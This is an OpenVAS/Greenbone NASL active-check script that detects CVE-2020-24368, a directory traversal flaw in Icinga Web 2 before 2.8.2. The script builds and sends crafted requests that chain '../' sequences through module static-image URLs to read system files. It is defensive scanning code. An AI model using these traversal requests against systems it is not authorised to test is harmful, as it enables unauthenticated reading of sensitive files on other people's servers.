# SPDX-FileCopyrightText: 2020 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:icinga:icingaweb2";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.144432");
  script_version("2025-05-06T05:40:10+0000");
  script_tag(name:"last_modification", value:"2025-05-06 05:40:10 +0000 (Tue, 06 May 2025)");
  script_tag(name:"creation_date", value:"2020-08-20 03:46:03 +0000 (Thu, 20 Aug 2020)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2020-10-16 18:15:00 +0000 (Fri, 16 Oct 2020)");

  script_cve_id("CVE-2020-24368");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Icinga Web 2 < 2.8.2 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_icinga_icingaweb2_consolidation.nasl", "os_detection.nasl");
  script_mandatory_keys("icinga/icingaweb2/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Icinga Web 2 is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability allows an attacker to access arbitrary files
  which are readable by the process running Icinga Web 2. (This is usually the web server or fpm
  process)

  To exploit this vulnerability the attacker has to acquire the following knowledge:

  - The URI at which Icinga Web 2 is accessible

  - An installed additional (non-core) module, which can be leveraged (known public modules are
  businessprocess, director, reporting, map and globe)

  - The module's install path

  A valid user login is NOT required.");

  script_tag(name:"impact", value:"An unauthenticated attacker may read arbitrary files.");

  script_tag(name:"affected", value:"Icinga Web 2 prior to version 2.8.2.");

  script_tag(name:"solution", value:"Update to version 2.8.2 or later.");

  script_xref(name:"URL", value:"https://github.com/Icinga/icingaweb2/issues/4226");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("os_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

urls = make_list("/static/img?module_name=businessprocess&file=",
                 "/static/img?module_name=director&file=",
                 "/static/img?module_name=reporting&file=",
                 "/static/img?module_name=map&file=",
                 "/static/img?module_name=globe&file=");

foreach url (urls) {
  foreach pattern (keys(files)) {
    file = files[pattern];
    payload = dir + url + crap(length: 7*3, data: "../") + file;
    if (http_vuln_check(port: port, url: payload, pattern: pattern, check_header: TRUE)) {
      report = http_report_vuln_url(port: port, url: payload);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
